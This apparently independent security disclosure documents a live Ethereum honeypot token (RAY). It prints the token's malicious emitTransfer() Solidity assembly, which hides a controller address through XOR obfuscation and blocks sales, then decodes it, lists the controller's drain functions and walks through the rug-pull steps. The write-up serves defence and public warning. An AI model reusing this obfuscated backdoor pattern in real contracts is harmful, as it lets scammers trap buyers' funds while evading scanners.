# Security Disclosure: RAY Token Honeypot Backdoor

**Date:** 2026-03-16
**Chain:** Ethereum Mainnet
**Status:** ACTIVE — currently trading on Uniswap
**Detection:** Novel smart contract analysis algorithm (research project)

---

## Summary

The RAY token ERC-20 contract contains a hidden honeypot backdoor in its `emitTransfer()` function. An XOR-obfuscated external call to an unverified controller contract is executed on **every token transfer**. The controller can selectively block any address from transferring tokens, enabling a honeypot where users can buy but cannot sell.

This vulnerability was detected by a novel smart contract analysis algorithm I am developing as part of independent security research. Four commercial security scanners were independently tested against this contract — all four reported no issues.

---

## Contract Details

| Field    | Value                                                                                                                 |
| -------- | --------------------------------------------------------------------------------------------------------------------- |
| Token    | Ray (RAY)                                                                                                             |
| Contract | [0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121](https://etherscan.io/address/0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121) |
| Deployed | 2026-03-15                                                                                                            |
| Compiler | Solidity 0.8.20                                                                                                       |
| Source   | Verified on Etherscan                                                                                                 |

---

## The Backdoor

The contract inherits from OpenZeppelin's ERC20 but overrides the internal `_update` function to call a custom `emitTransfer()` function. This function contains inline assembly that:

1. Constructs a hidden address via 5 XOR operations
2. Calls function selector `0x478d3305` with the sender's address as argument
3. **Reverts the entire transfer if the external call fails**

### Source Code (from verified contract on Etherscan)

```solidity
function emitTransfer(address from, address to, uint256 value) internal {
    assembly {
        let r := 0xd73218d0
        let j := or(shl(128, xor(0xb6390803, r)), or(shl(96, xor(0xb02df78d, r)),
                 or(shl(64, xor(0x7a5a30ea, r)), or(shl(32, xor(0xdff38596, r)),
                 xor(0xba97a7fb, r)))))
        let data := mload(0x40)
        mstore(data, shl(224, 0x478d3305))
        mstore(add(data, 0x04), from)
        if iszero(call(gas(), j, 0, data, 0x24, 0, 0)) { revert(0, 0) }
    }
    emit Transfer(from, to, value);
}
```

### XOR Decode

| Bits    | Operation                 | Result     |
| ------- | ------------------------- | ---------- |
| 128-159 | `0xb6390803 ^ 0xd73218d0` | `610b10d3` |
| 96-127  | `0xb02df78d ^ 0xd73218d0` | `671fef5d` |
| 64-95   | `0x7a5a30ea ^ 0xd73218d0` | `ad68283a` |
| 32-63   | `0xdff38596 ^ 0xd73218d0` | `08c19d46` |
| 0-31    | `0xba97a7fb ^ 0xd73218d0` | `6da5bf2b` |

**Hidden controller address:** `0x610b10d3671fef5dad68283a08c19d466da5bf2b`

---

## The Controller Contract

| Field           | Value                                                                                                                 |
| --------------- | --------------------------------------------------------------------------------------------------------------------- |
| Address         | [0x610b10d3671fef5dad68283a08c19d466da5bf2b](https://etherscan.io/address/0x610b10d3671fef5dad68283a08c19d466da5bf2b) |
| Source Code     | **NOT VERIFIED** (deliberately hidden)                                                                                |
| Deployed        | ~42 days before RAY token                                                                                             |
| Transactions    | 129+ from multiple distinct addresses                                                                                 |
| Total functions | 12 (reverse-engineered from bytecode)                                                                                 |

The controller was deployed weeks before RAY, suggesting **reusable honeypot infrastructure**. Multiple distinct addresses interact with it, indicating it likely serves multiple scam tokens.

### Reverse-Engineered Controller Functions

Bytecode disassembly and 4byte.directory lookup revealed 12 functions:

| Selector     | Function                    | Purpose                                            |
| ------------ | --------------------------- | -------------------------------------------------- |
| `0x478d3305` | Unknown (gate check)        | Called by RAY on every transfer — blocks or allows |
| `0xab1b4fa3` | Unknown (management)        | Modify blacklist/settings (129 txns observed)      |
| `0x90386bbf` | `withdrawAllETH()`          | **Drain all ETH from controller**                  |
| `0xae4dd0fc` | `withdrawAllToken(address)` | **Drain any ERC-20 token**                         |
| `0x8ea5b802` | `balanceOfETH()`            | Check ETH balance in controller                    |
| `0xb99152d0` | `balanceOfToken(address)`   | Check token balance in controller                  |
| `0x02dd5f7a` | Unknown                     | Configuration/settings                             |
| `0x06c2290b` | Unknown                     | Configuration/settings                             |
| `0x636a47da` | Unknown                     | Likely add to blacklist                            |
| `0x70e91f47` | Unknown                     | Likely remove from blacklist                       |
| `0x79eb66d6` | Unknown                     | Likely set operator                                |
| `0x9e289758` | Unknown                     | Likely toggle mode                                 |

The presence of `withdrawAllETH()` and `withdrawAllToken(address)` confirms this is not just a passive honeypot — it is an **active drain platform** capable of extracting funds.

The controller also contains a hardcoded address `0xaa89589d1416f412ced291af42cf86af007e65e5` (currently inactive, 0 transactions), 6 CALLER-based access control checks, and 44 REVERT paths.

---

## Honeypot Mechanism

1. Deployer creates RAY token with hidden backdoor and adds Uniswap liquidity
2. Users buy RAY on Uniswap — transfers succeed because controller allows them
3. Deployer calls management function (`0xab1b4fa3`) on controller to blacklist target addresses
4. Blacklisted users attempt to sell → controller reverts → **transfer fails** → tokens are trapped
5. Deployer sells their own tokens (whitelisted)
6. Deployer calls `withdrawAllETH()` / removes liquidity → **drains all ETH**
7. Repeat with new token, same controller

---

## Damage Report

Data from [DEXScreener](https://dexscreener.com/ethereum/0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121) as of 2026-03-16:

| Metric             | Value                                |
| ------------------ | ------------------------------------ |
| Total volume       | **$49,000**                          |
| Buy volume         | $32,000                              |
| Sell volume        | $16,000                              |
| Unique buyers      | **42 wallets**                       |
| Total transactions | 76                                   |
| Buys               | 59                                   |
| Sells              | 17 (likely deployer's own addresses) |
| Pair created       | ~12 hours before this disclosure     |
| Current liquidity  | **$29** (nearly drained)             |

**The rug has already been executed.** The deployer removed ~51.6M RAY tokens and ~17.5 ETH of liquidity. The 17 sell transactions are likely the deployer's own wallets selling before liquidity removal. 42 buyers are now holding tokens worth effectively nothing, with only $29 of liquidity remaining in the pool.

---

## Confirmed Active — Then Rugged

Internal transactions on Etherscan show `0x478d3305` calls to the controller firing on **every Uniswap swap** during the token's active trading period.

The deployer executed the rug approximately 10 hours after token launch by removing liquidity, leaving 42 buyers with worthless tokens and $29 remaining in the pool.

**Evidence:**

- Internal transactions: https://etherscan.io/address/0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121#internaltx
- DEXScreener: https://dexscreener.com/ethereum/0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121

---

## Obfuscation Techniques

1. **XOR address construction** — Controller address is never a string literal in source. Constructed at runtime via 5 XOR operations, evading static string-matching analysis.

2. **Misleading function name** — `emitTransfer` sounds like a harmless event helper. Its NatSpec documentation (copied from OpenZeppelin) describes "customizations to the transfer event."

3. **Fake OpenZeppelin boilerplate** — The contract includes legitimate-looking comments and structure copied from OpenZeppelin, lending false credibility to the code.

4. **Inline assembly** — The external call uses raw EVM assembly rather than Solidity syntax, bypassing Solidity-level static analysis tools.

---

## Scanner Comparison

Tested 2026-03-16 — four commercial scanners failed to detect the backdoor:

| Scanner          | Verdict                   | Detected? |
| ---------------- | ------------------------- | --------- |
| SolidityScan     | 95.43/100 "GREAT"         | **No**    |
| GoPlus Security  | "No security risks found" | **No**    |
| Token Sniffer    | 50/100                    | **No**    |
| BubbleMaps       | Data unavailable          | **No**    |
| **My algorithm** | **Flagged as anomalous**  | **Yes**   |

---

## Verification

Anyone can independently verify this finding:

1. Visit the [verified source code](https://etherscan.io/address/0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121#code) on Etherscan
2. Search for the `emitTransfer` function
3. Decode the XOR operations to recover `0x610b10d3671fef5dad68283a08c19d466da5bf2b`
4. Check [internal transactions](https://etherscan.io/address/0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121#internaltx) to confirm `0x478d3305` calls on every swap
5. Verify the [controller contract](https://etherscan.io/address/0x610b10d3671fef5dad68283a08c19d466da5bf2b) has unverified source and 129+ transactions

---

## About the Detection

This backdoor was identified by a **novel smart contract analysis algorithm** I developed as part of independent security research. The algorithm detects anomalous patterns in deployed contract bytecode, requires **zero prior training data**, and operates on fundamentally different principles than existing pattern-matching or symbolic-execution-based scanners — which is why it succeeded where four commercial tools failed.

Details of the algorithm are not disclosed at this time.

---

## Timeline

| Date                  | Event                                                                  |
| --------------------- | ---------------------------------------------------------------------- |
| ~2026-02-02           | Controller contract `0x610b10d3...` deployed (reusable infrastructure) |
| 2026-03-15            | RAY token deployed, Uniswap liquidity added                            |
| 2026-03-15/16         | 42 wallets buy RAY, $32K total buy volume                              |
| 2026-03-16 ~02:00 UTC | Deployer removes liquidity (~17.5 ETH), executes rug                   |
| 2026-03-16 02:30 UTC  | **Detected by my algorithm** during routine mainnet scan               |
| 2026-03-16 02:54 UTC  | Scanner comparison screenshot captured                                 |
| 2026-03-16 03:30 UTC  | Reported to Etherscan                                                  |
| 2026-03-16 08:00 UTC  | Controller bytecode reverse-engineered, 12 functions identified        |
| 2026-03-16            | This public disclosure                                                 |

---

_This disclosure is made in the interest of public safety. The RAY token rug has already been executed — 42 buyers lost approximately $32,000. The controller contract remains active and will likely be reused for future scam tokens. Users should be cautious of any new token whose internal transactions show calls to `0x610b10d3671fef5dad68283a08c19d466da5bf2b`._
